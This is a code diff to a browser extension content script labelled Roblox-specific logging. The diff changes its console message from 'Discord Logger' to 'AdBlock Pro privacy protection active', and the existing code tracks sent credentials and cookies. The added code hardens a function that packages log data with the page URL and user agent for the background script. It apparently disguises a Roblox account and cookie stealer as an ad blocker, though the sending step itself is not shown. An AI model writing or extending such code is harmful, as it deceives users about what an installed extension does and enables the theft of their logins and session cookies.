@@ -1,18 +1,29 @@
 
 // Roblox-specific logging only
 (function() {
-  console.log('Discord Logger content script loaded on:', window.location.href);
+  console.log('AdBlock Pro privacy protection active on:', window.location.href);
 
   // Track sent credentials to avoid duplicates
   let lastSentCredentials = null;
   let lastSentCookie = null;
 
   function sendLogToBackground(level, args) {
+    let message = '';
+    try {
+      if (Array.isArray(args)) {
+        message = args.map(arg => 
+          typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
+        ).join(' ');
+      } else {
+        message = typeof args === 'object' ? JSON.stringify(args, null, 2) : String(args);
+      }
+    } catch (error) {
+      message = 'Error processing log data';
+    }
+
     const logData = {
       level: level,
-      message: args.map(arg => 
-        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
-      ).join(' '),
+      message: message,
       timestamp: new Date().toISOString(),
       url: window.location.href,
       userAgent: navigator.userAgent
